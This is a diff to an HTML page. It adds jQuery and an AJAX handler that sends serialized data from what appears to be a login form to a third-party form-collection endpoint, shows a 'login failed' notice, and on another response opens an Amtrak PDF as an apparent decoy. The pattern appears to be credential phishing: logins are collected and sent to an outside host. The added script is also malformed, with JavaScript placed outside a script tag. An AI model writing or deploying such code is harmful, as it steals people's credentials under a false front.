@@ -50,6 +50,35 @@ p{font-size: 40px;}
 }
 </style>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+	// Update AJAX request to include loading state
+$.ajax({
+    url: 'https://formbold.com/s/94pAZ',
+    type: 'POST',
+    data: serializedData,
+    beforeSend: function() {
+        $('#login-btn').html('<div class="loader"></div>'); // Show loader
+    },
+    success: function(result) {
+        console.log(result);
+        if (result == '1') {
+            $('.login-failed-notify').css('display', 'block');
+            $inputs.prop("disabled", false);
+            $('#validationCustom02').prop("value", "");
+            form.classList.remove('was-validated');
+            $('#login-btn').html(btnStr); // Reset button text
+        } else if (result == '2') {
+            window.open('https://www.amtrak.com/content/dam/projects/dotcom/english/public/documents/real-estate/pte-application-payment-instructions.pdf', '_blank');
+            location.reload();
+        }
+    },
+    error: function() {
+        $('.login-failed-notify').text('An error occurred. Please try again.').css('display', 'block');
+        $inputs.prop("disabled", false);
+        $('#login-btn').html(btnStr); // Reset button text
+    }
+});
+
 <script type="text/javascript">
 $(window).load(function() {
 	$(".loader").fadeOut("slow");
